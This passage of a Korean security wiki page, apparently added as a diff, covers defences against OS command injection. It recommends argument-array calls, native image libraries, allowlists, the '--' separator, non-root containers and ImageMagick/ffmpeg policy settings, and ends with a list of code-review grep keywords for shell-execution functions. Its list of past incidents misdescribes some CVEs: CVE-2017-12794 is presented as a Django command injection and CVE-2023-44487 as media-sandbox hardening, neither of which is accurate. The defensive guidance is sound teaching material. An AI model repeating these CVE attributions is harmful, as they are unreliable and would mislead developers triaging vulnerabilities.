+<div class="language-typescript highlight"><pre><span></span><code><span id="__span-14-1"><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a><span class="c1">// Node.js — execFile, spawn 모두 기본은 셸 미사용</span>
+</span><span id="__span-14-2"><a id="__codelineno-14-2" name="__codelineno-14-2" href="#__codelineno-14-2"></a><span class="k">import</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="nx">execFile</span><span class="p">,</span><span class="w"> </span><span class="nx">spawn</span><span class="w"> </span><span class="p">}</span><span class="w"> </span><span class="kr">from</span><span class="w"> </span><span class="s1">&#39;child_process&#39;</span><span class="p">;</span>
+</span><span id="__span-14-3"><a id="__codelineno-14-3" name="__codelineno-14-3" href="#__codelineno-14-3"></a><span class="nx">execFile</span><span class="p">(</span><span class="s1">&#39;convert&#39;</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="nx">filename</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;output.webp&#39;</span><span class="p">]);</span>
+</span><span id="__span-14-4"><a id="__codelineno-14-4" name="__codelineno-14-4" href="#__codelineno-14-4"></a><span class="nx">spawn</span><span class="p">(</span><span class="s1">&#39;convert&#39;</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="nx">filename</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;output.webp&#39;</span><span class="p">]);</span>
+</span><span id="__span-14-5"><a id="__codelineno-14-5" name="__codelineno-14-5" href="#__codelineno-14-5"></a>
+</span><span id="__span-14-6"><a id="__codelineno-14-6" name="__codelineno-14-6" href="#__codelineno-14-6"></a><span class="c1">// Python — shell=False 가 기본값</span>
+</span><span id="__span-14-7"><a id="__codelineno-14-7" name="__codelineno-14-7" href="#__codelineno-14-7"></a><span class="c1">// subprocess.run([&#39;convert&#39;, filename, &#39;output.webp&#39;])</span>
+</span></code></pre></div>
+<h3 id="2-외부-명령을-아예-호출하지-않는다">2. 외부 명령을 아예 호출하지 않는다<a class="headerlink" href="#2-외부-명령을-아예-호출하지-않는다" title="Permanent link">&para;</a></h3>
+<p>가능한 경우 라이브러리 바인딩으로 대체한다. 이미지 처리는 sharp(Node.js), Pillow(Python), Thumbnailator(Java) 같은 네이티브 바인딩 라이브러리를 쓰면 ImageMagick 자체를 띄우지 않아도 된다. 외부 프로세스 호출이 사라지면 명령 인젝션도 사라진다.</p>
+<h3 id="3-인자에-들어갈-값은-allowlist로-제한">3. 인자에 들어갈 값은 allowlist로 제한<a class="headerlink" href="#3-인자에-들어갈-값은-allowlist로-제한" title="Permanent link">&para;</a></h3>
+<p>자유 입력을 그대로 인자로 넘기지 말고, 허용된 값만 통과시킨다.</p>
+<div class="language-python highlight"><pre><span></span><code><span id="__span-15-1"><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a><span class="n">ALLOWED_FORMATS</span> <span class="o">=</span> <span class="p">{</span><span class="s1">&#39;png&#39;</span><span class="p">,</span> <span class="s1">&#39;jpg&#39;</span><span class="p">,</span> <span class="s1">&#39;webp&#39;</span><span class="p">}</span>
+</span><span id="__span-15-2"><a id="__codelineno-15-2" name="__codelineno-15-2" href="#__codelineno-15-2"></a>
+</span><span id="__span-15-3"><a id="__codelineno-15-3" name="__codelineno-15-3" href="#__codelineno-15-3"></a><span class="k">def</span><span class="w"> </span><span class="nf">convert</span><span class="p">(</span><span class="n">input_path</span><span class="p">,</span> <span class="n">target_format</span><span class="p">):</span>
+</span><span id="__span-15-4"><a id="__codelineno-15-4" name="__codelineno-15-4" href="#__codelineno-15-4"></a>    <span class="k">if</span> <span class="n">target_format</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">ALLOWED_FORMATS</span><span class="p">:</span>
+</span><span id="__span-15-5"><a id="__codelineno-15-5" name="__codelineno-15-5" href="#__codelineno-15-5"></a>        <span class="k">raise</span> <span class="ne">ValueError</span><span class="p">(</span><span class="s2">&quot;Unsupported format&quot;</span><span class="p">)</span>
+</span><span id="__span-15-6"><a id="__codelineno-15-6" name="__codelineno-15-6" href="#__codelineno-15-6"></a>    <span class="n">subprocess</span><span class="o">.</span><span class="n">run</span><span class="p">([</span><span class="s1">&#39;convert&#39;</span><span class="p">,</span> <span class="n">input_path</span><span class="p">,</span> <span class="sa">f</span><span class="s1">&#39;output.</span><span class="si">{</span><span class="n">target_format</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">])</span>
+</span></code></pre></div>
+<p>블록리스트(금지 문자 목록)는 거의 항상 우회된다. 새로운 메타문자, 인코딩 트릭, 유니코드 변형이 끊임없이 나오기 때문이다. allowlist는 허용된 것만 통과시키므로 우회가 원천 차단된다.</p>
+<h3 id="4-인자-앞에----또는-경로-prefix를-붙인다">4. 인자 앞에 <code>--</code> 또는 경로 prefix를 붙인다<a class="headerlink" href="#4-인자-앞에----또는-경로-prefix를-붙인다" title="Permanent link">&para;</a></h3>
+<p>인자 인젝션 방어책이다. 사용자 입력이 옵션처럼 해석되는 걸 막는다.</p>
+<div class="language-python highlight"><pre><span></span><code><span id="__span-16-1"><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a><span class="n">subprocess</span><span class="o">.</span><span class="n">run</span><span class="p">([</span><span class="s1">&#39;ffmpeg&#39;</span><span class="p">,</span> <span class="s1">&#39;-i&#39;</span><span class="p">,</span> <span class="s1">&#39;--&#39;</span><span class="p">,</span> <span class="n">user_input</span><span class="p">,</span> <span class="s1">&#39;output.mp4&#39;</span><span class="p">])</span>
+</span><span id="__span-16-2"><a id="__codelineno-16-2" name="__codelineno-16-2" href="#__codelineno-16-2"></a><span class="c1"># 또는</span>
+</span><span id="__span-16-3"><a id="__codelineno-16-3" name="__codelineno-16-3" href="#__codelineno-16-3"></a><span class="n">subprocess</span><span class="o">.</span><span class="n">run</span><span class="p">([</span><span class="s1">&#39;ffmpeg&#39;</span><span class="p">,</span> <span class="s1">&#39;-i&#39;</span><span class="p">,</span> <span class="sa">f</span><span class="s1">&#39;./</span><span class="si">{</span><span class="n">user_input</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">,</span> <span class="s1">&#39;output.mp4&#39;</span><span class="p">])</span>
+</span></code></pre></div>
+<p><code>--</code>는 GNU 컨벤션으로 "이 뒤로는 옵션이 아니다"를 의미한다. 모든 도구가 지원하지는 않으니 도구 매뉴얼을 확인해야 한다.</p>
+<h3 id="5-최소-권한으로-실행">5. 최소 권한으로 실행<a class="headerlink" href="#5-최소-권한으로-실행" title="Permanent link">&para;</a></h3>
+<p>명령 인젝션이 뚫리는 걸 0%로 만들 수는 없으니, 뚫렸을 때 피해를 줄이는 게 다음 방어선이다. 컨테이너로 격리하고, 컨테이너 안에서도 비-root 사용자로 실행한다. seccomp 프로필로 시스템 콜을 제한하면 리버스 셸이 막힐 수 있다.</p>
+<div class="language-dockerfile highlight"><pre><span></span><code><span id="__span-17-1"><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a><span class="k">FROM</span><span class="w"> </span><span class="s">alpine:3.19</span>
+</span><span id="__span-17-2"><a id="__codelineno-17-2" name="__codelineno-17-2" href="#__codelineno-17-2"></a><span class="k">RUN</span><span class="w"> </span>adduser<span class="w"> </span>-D<span class="w"> </span>-u<span class="w"> </span><span class="m">1000</span><span class="w"> </span>worker
+</span><span id="__span-17-3"><a id="__codelineno-17-3" name="__codelineno-17-3" href="#__codelineno-17-3"></a><span class="k">USER</span><span class="w"> </span><span class="s">worker</span>
+</span><span id="__span-17-4"><a id="__codelineno-17-4" name="__codelineno-17-4" href="#__codelineno-17-4"></a><span class="k">ENTRYPOINT</span><span class="w"> </span><span class="p">[</span><span class="s2">&quot;/usr/bin/convert&quot;</span><span class="p">]</span>
+</span></code></pre></div>
+<h3 id="6-미디어-라이브러리-정책-강화">6. 미디어 라이브러리 정책 강화<a class="headerlink" href="#6-미디어-라이브러리-정책-강화" title="Permanent link">&para;</a></h3>
+<p>ImageMagick은 <code>policy.xml</code>에서 위험 코더를 disable한다. ffmpeg은 <code>-protocol_whitelist</code>로 허용 프로토콜을 제한한다. 이 설정이 빠진 운영 서버는 ImageTragick 류 사고에 그대로 노출된다.</p>
+<hr />
+<h2 id="사고-사례에서-배우는-것">사고 사례에서 배우는 것<a class="headerlink" href="#사고-사례에서-배우는-것" title="Permanent link">&para;</a></h2>
+<p>ImageTragick 외에도 같은 계열 사고가 반복적으로 발생했다. 패턴을 보면 거의 똑같다.</p>
+<ul>
+<li><strong>CVE-2014-6271 Shellshock</strong>: bash 환경 변수를 통한 코드 실행. CGI 스크립트가 사용자 입력을 환경 변수로 넘기는 과정에서 트리거. 명령 인젝션의 변형이다.</li>
+<li><strong>CVE-2017-12794 Django</strong>: 디버그 페이지 렌더링 중 외부 명령 호출 경로에서 인젝션 가능성.</li>
+<li><strong>CVE-2021-22204 ExifTool</strong>: 이미지 메타데이터 처리 중 Perl 스크립트 실행. GitLab이 이걸로 RCE를 당했다.</li>
+<li><strong>CVE-2022-44268 ImageMagick</strong>: PNG 메타데이터 처리에서 임의 파일 읽기. RCE는 아니지만 같은 라이브러리 계열.</li>
+<li><strong>CVE-2023-44487 / 보안 패치 사례들</strong>: 미디어 변환 컨테이너의 sandboxing 강화 흐름.</li>
+</ul>
+<p>공통점은 두 가지다. 첫째, 사용자 입력이 외부 바이너리 인자나 외부 자원 참조로 흘러들어간다. 둘째, 그 바이너리 내부에 코드 실행 경로가 숨어 있다. 직접 셸을 부르지 않아도 라이브러리가 대신 부른다는 게 핵심이다.</p>
+<p>운영하는 코드에 외부 바이너리 호출이 있다면 다음을 확인한다. 어떤 함수로 호출하는지(셸 경유 여부), 인자에 사용자 입력이 들어가는지, 그 바이너리가 처리하는 파일 포맷에 코드 실행 경로가 있는지. 세 가지 중 하나라도 위험 신호가 보이면 라이브러리 자체를 점검한다.</p>
+<hr />
+<h2 id="코드-리뷰-시-확인-포인트">코드 리뷰 시 확인 포인트<a class="headerlink" href="#코드-리뷰-시-확인-포인트" title="Permanent link">&para;</a></h2>
+<p>리뷰 시점에 잡으려면 다음 패턴을 grep한다. 정규식이라기보다 키워드 수준이다.</p>
+<ul>
+<li><code>exec(</code>, <code>system(</code>, <code>shell_exec(</code>, <code>popen(</code> — 변수가 들어 있으면 의심</li>
+<li><code>Runtime.getRuntime().exec(</code> — String 한 개짜리 시그니처는 거의 항상 위험</li>
+<li><code>child_process.exec(</code> — <code>execFile</code>로 바꿀 수 있는지 확인</li>
+<li><code>subprocess.run(...shell=True</code> — shell=True 자체가 레드 플래그</li>
+<li>백틱(<code>`</code>)이 변수와 함께 있는 PHP 코드</li>
+<li><code>os.system</code>, <code>os.popen</code> 호출 전부</li>
+</ul>
+<p>전체 코드베이스에 한 번이라도 위 패턴이 나타나면 그 모든 호출을 따라가서 입력 출처를 추적한다. 사용자 입력이 도달 가능하면 인자 분리(<code>exec → execFile</code>)로 리팩토링한다. 호출 함수를 바꾸는 건 보통 한두 줄 수정이라 비용이 적다.</p>
+<!-- related-docs -->
+<hr />
+<p><strong>관련 문서</strong></p>
+<ul>
+<li><a href="../AES/">AES (Advanced Encryption Standard)</a></li>
+<li><a href="../AI_for_Security/">AI로 보안 강화하기 (LLM in Security Operations)</a></li>
+<li><a href="../API_Gateway_Security/">API Gateway Security</a></li>
+<li><a href="../API_Input_Validation/">API Input Validation</a></li>
+<li><a href="../API_Security/">API Security</a></li>
+</ul>
+
+
+
+
+
+
+
+  
+  
+
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+    
+      
+      <nav class="md-footer__inner md-grid" aria-label="하단/푸터" >
+        
+          
+          <a href="../Clickjacking/" class="md-footer__link md-footer__link--prev" aria-label="이전: Clickjacking">
+            <div class="md-footer__button md-icon">
+              
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+            </div>
+            <div class="md-footer__title">
+              <span class="md-footer__direction">
+                이전
+              </span>
+              <div class="md-ellipsis">
+                Clickjacking
+              </div>
+            </div>
+          </a>
+        
+        
+          
+          <a href="../Insecure_Deserialization/" class="md-footer__link md-footer__link--next" aria-label="다음: 안전하지 않은 역직렬화">
+            <div class="md-footer__title">
+              <span class="md-footer__direction">
+                다음
+              </span>
+              <div class="md-ellipsis">
+                안전하지 않은 역직렬화
+              </div>
+            </div>
+            <div class="md-footer__button md-icon">
+              
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M4 11v2h12l-5.5 5.5 1.42 1.42L19.84 12l-7.92-7.92L10.5 5.5 16 11z"/></svg>
+            </div>
+          </a>
+        
+      </nav>
+    
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+    <div class="md-copyright__highlight">
+      Copyright &copy; 2024 - 2026 GYUTORY
+    </div>
+  
+  
+</div>
+      
+        
+<div class="md-social">
+  
+    
+    
+    
+    
+      
+      
+    
+    <a href="https://github.com/GYUTORY" target="_blank" rel="noopener" title="github.com" class="md-social__link">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><!--! Font Awesome Free 7.1.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M173.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6m-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3m44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9M252.8 8C114.1 8 8 113.3 8 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C436.2 457.8 504 362.9 504 252 504 113.3 391.5 8 252.8 8M105.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1m-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7m32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1m-11.4-14.7c-1.6 1-1.6 3.6 0 5.9s4.3 3.3 5.6 2.3c1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2"/></svg>
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+      <div class="md-progress" data-md-component="progress" role="progressbar"></div>
+    
+    
+    
+      
+      
+      <script id="__config" type="application/json">{"annotate": null, "base": "../..", "features": ["navigation.instant", "navigation.instant.progress", "navigation.prune", "navigation.tracking", "navigation.indexes", "navigation.footer", "search.suggest", "search.highlight", "search.share", "content.code.copy", "content.code.annotate", "content.tooltips", "toc.follow"], "search": "../../assets/javascripts/workers/search.2c215733.min.js", "tags": null, "translations": {"clipboard.copied": "\ud074\ub9bd\ubcf4\ub4dc\uc5d0 \ubcf5\uc0ac\ub428", "clipboard.copy": "\ud074\ub9bd\ubcf4\ub4dc\ub85c \ubcf5\uc0ac", "search.result.more.one": "\uc774 \ubb38\uc11c\uc5d0\uc11c 1\uac1c\uc758 \uac80\uc0c9 \uacb0\uacfc \ub354 \ubcf4\uae30", "search.result.more.other": "\uc774 \ubb38\uc11c\uc5d0\uc11c #\uac1c\uc758 \uac80\uc0c9 \uacb0\uacfc \ub354 \ubcf4\uae30", "search.result.none": "\uac80\uc0c9\uc5b4\uc640 \uc77c\uce58\ud558\ub294 \ubb38\uc11c\uac00 \uc5c6\uc2b5\ub2c8\ub2e4", "search.result.one": "1\uac1c\uc758 \uc77c\uce58\ud558\ub294 \ubb38\uc11c", "search.result.other": "#\uac1c\uc758 \uc77c\uce58\ud558\ub294 \ubb38\uc11c", "search.result.placeholder": "\uac80\uc0c9\uc5b4\ub97c \uc785\ub825\ud558\uc138\uc694", "search.result.term.missing": "\ud3ec\ud568\ub418\uc9c0 \uc54a\uc740 \uac80\uc0c9\uc5b4", "select.version": "\ubc84\uc804 \uc120\ud0dd"}, "version": null}</script>
+    
+    
+      <script src="../../assets/javascripts/bundle.d7400e89.min.js"></script>
+      
+        <script src="../../javascripts/extra.js"></script>
+      
+        <script src="../../javascripts/mermaid-init.js"></script>
+      
+    
+  </body>
+</html>
